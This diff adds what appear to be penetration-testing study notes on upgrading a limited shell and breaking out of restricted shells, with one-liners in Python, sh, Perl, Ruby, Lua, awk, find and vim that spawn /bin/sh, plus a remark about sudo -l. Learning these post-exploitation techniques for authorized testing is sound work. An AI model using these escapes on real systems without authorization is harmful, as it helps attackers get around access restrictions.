@@ -1,0 +1,28 @@
+- There may be times that we land **on a system with a limited shell, and Python is not installed**. In these cases, it's good to know that we could use several different methods to spawn an interactive shell. Let's examine some of them:
+
+# Breaking Restricted / Limited Shells
+---
+- Python:
+	- `python -c 'import pty; pty.spawn("/bin/sh")' `
+- Sh:
+	- `/bin/sh -i`
+- Perl
+	- `perl —e 'exec "/bin/sh";'`
+	- `perl: exec "/bin/sh";`
+- Ruby
+	- `ruby: exec "/bin/sh"`
+- Lua
+	- `lua: os.execute('/bin/sh')`
+- AWK
+	- `awk 'BEGIN {system("/bin/sh")}'`
+- Find
+	- `find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;`
+	- Using Exec To Launch A Shell:
+		- `find . -exec /bin/sh \; -quit`
+- VIM
+	- `vim -c ':!/bin/sh'`
+	- Vim Escape: 
+		- `:set shell=/bin/sh`
+		- `:shell`
+- Sudo -l:
+	- The sudo -l command above will need a stable interactive shell to run. If you are not in a full shell or sitting in an unstable shell, you may not get any return from it. 
